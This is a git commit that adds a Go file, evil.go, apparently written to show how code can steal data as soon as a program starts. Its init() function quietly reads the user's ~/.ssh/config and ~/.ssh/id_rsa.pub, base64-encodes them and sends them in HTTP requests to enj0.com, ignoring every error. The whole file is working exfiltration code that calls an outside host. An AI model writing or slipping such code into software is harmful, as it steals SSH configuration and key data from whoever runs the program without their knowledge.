f5e223bbd2a57bb972fafd060ea4f3e6d93e0b1d
Ruotian Zhang <me@zrt.io>
2019-03-21 21:48:35 -0500

    init

---
+++ evil.go
@@ -0,0 +1,44 @@
+package main
+
+import (
+	"encoding/base64"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os/user"
+)
+
+func init() {
+	go func() {
+
+		user, err := user.Current()
+		if err != nil {
+
+		}
+
+		b, err := ioutil.ReadFile(user.HomeDir + "/.ssh/config")
+		if err != nil {
+
+		}
+
+		encoded := base64.StdEncoding.EncodeToString(b)
+
+		_, err = http.Get("http://enj0.com/evil/0/base64/" + encoded)
+		if err != nil {
+
+		}
+
+		b, err = ioutil.ReadFile(user.HomeDir + "/.ssh/id_rsa.pub") // 业界良心
+		if err != nil {
+
+		}
+
+		encoded = base64.StdEncoding.EncodeToString(b)
+
+		_, err = http.Get("http://enj0.com/evil/1/base64/" + encoded)
+		if err != nil {
+
+		}
+
+	}()
+}
